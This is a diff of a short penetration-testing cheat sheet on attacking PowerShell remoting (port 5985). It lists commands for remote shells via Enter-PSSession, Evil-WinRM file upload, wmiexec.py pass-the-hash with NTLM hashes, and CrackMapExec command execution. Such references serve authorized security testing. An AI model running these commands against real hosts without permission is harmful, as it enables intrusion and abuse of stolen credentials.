@@ -1,27 +1,29 @@
----
-description: >-
-  enables an administrator to remotely manage many Windows Servers from a
-  central location
----
+# 5985 - PowerShell remoting
 
-# 5985 - PS remoting
+## Using PowerShell
 
-```text
-PS> Enter-PSSession <target>
+```powershell
+Enter-PSSession -ComputerName COMPUTERNAME -Credential DOMAIN/USERNAME
+Enter-PSSession -ComputerName COMPUTERNAME -Credential DOMAIN/USERNAME -ScriptBlock {hostname;whoami,ipconfig}
 ```
+## Using Evil-WinRM
 
-```text
+```bash
 sudo gem install evil-winrm
-evil-winrm -u <user> -p <pass> -i <target>
-> upload <file>
+evil-winrm -u USERNAME -p PASSWORD -i RHOST
+> upload FILENAME
 ```
 
-```text
-python3 wmiexec.py -hashes <hash:hash> <user>@<target>
+## Using WMIExec
+
+```bash
+python3 wmiexec.py -hashes NTLMHASH USERNAME@RHOST
 ```
 
-```text
-crackmapexec winrm <target> -u <user> -p <pass>
-crackmapexec winrm <target> -u <user> -p <pass> -X "<command>"
+## Using CrackMapExec
+
+```bash
+crackmapexec winrm RHOST -u USERNAME -p PASSWORD
+crackmapexec winrm RHOST -u USERNAME -p PASSWORD -X "COMMAND"
 ```
 
